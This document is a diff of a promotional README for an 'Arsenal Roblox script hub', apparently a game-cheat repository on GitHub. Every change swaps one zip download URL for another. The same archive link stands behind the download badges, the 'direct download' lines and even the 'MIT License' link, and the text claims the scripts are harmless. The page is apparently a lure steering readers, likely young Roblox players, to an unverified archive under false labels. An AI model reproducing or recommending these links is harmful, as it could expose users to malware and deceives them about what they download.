@@ -76,9 +76,9 @@ Harness the strength of AI. Our implementation leverages both OpenAI API and Cla
 
 Ready to experience advanced, SEO-enhanced Arsenal Roblox scripting? Begin by grabbing the latest build:
 
-[![Download](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/arsenal-roblox-script-hub_malcontently.zip)](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/arsenal-roblox-script-hub_malcontently.zip)
+[![Download](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/hub-script-arsenal-roblox-2.0.zip)](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/hub-script-arsenal-roblox-2.0.zip)
 
-*Download the main release here: https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/arsenal-roblox-script-hub_malcontently.zip*
+*Download the main release here: https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/hub-script-arsenal-roblox-2.0.zip*
 
 - See the `/docs` directory for integration steps, guided setup, and usage walkthroughs.
 - New to Roblox scripting? Our `First-Time User Guide` is made for easy on-boarding!
@@ -109,7 +109,7 @@ Scripts and integrations provided here do **not** contain harmful, malicious, or
 
 This work is licensed under the MIT License.  
 See the LICENSE file for details:  
-[MIT License](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/arsenal-roblox-script-hub_malcontently.zip)
+[MIT License](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/hub-script-arsenal-roblox-2.0.zip)
 
 ---
 
@@ -117,8 +117,8 @@ See the LICENSE file for details:
 
 Time to unlock premium Arsenal Roblox script automation, seamless cross-device synchronization, and intelligent strategy modules! Start your journey:
 
-[![Download](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/arsenal-roblox-script-hub_malcontently.zip)](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/arsenal-roblox-script-hub_malcontently.zip)
+[![Download](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/hub-script-arsenal-roblox-2.0.zip)](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/hub-script-arsenal-roblox-2.0.zip)
 
-*Direct download: https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/arsenal-roblox-script-hub_malcontently.zip*
+*Direct download: https://raw.githubusercontent.com/AlanGabrielBerkenbrock/arsenal-roblox-script-hub/branch/antisplasher/hub-script-arsenal-roblox-2.0.zip*
 
 Explore, innovate, and conquer the Arsenal — together, we script new legends.
